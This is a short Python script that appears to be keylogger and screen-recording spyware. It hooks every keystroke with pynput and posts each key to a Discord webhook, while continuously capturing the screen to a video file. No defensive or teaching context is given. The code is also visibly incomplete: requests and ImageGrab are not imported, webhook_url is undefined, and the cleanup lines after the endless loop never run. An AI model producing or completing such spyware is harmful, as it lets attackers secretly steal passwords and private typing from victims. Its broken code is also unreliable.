import cv2
import numpy as np
from pynput import keyboard

# Function to be called when a key is pressed
def on_press(key):
  # Format the key as a string
  key_str = str(key).replace("'", "")

  # Send the key to the Discord webhook
  requests.post(webhook_url, json={"content": key_str})

# Create a keyboard listener
listener = keyboard.Listener(on_press=on_press)

# Start the listener
listener.start()

# Open a video writer to save the recording
video_writer = cv2.VideoWriter("recording.mp4", cv2.VideoWriter_fourcc(*"mp4v"), 30, (1920, 1080))

# Keep the program running until the user presses a key
while True:
  # Capture the screen as an image
  img = np.array(ImageGrab.grab())

  # Write the image to the video
  video_writer.write(img)

# Stop the listener and close the video writer
listener.stop()
video_writer.release()
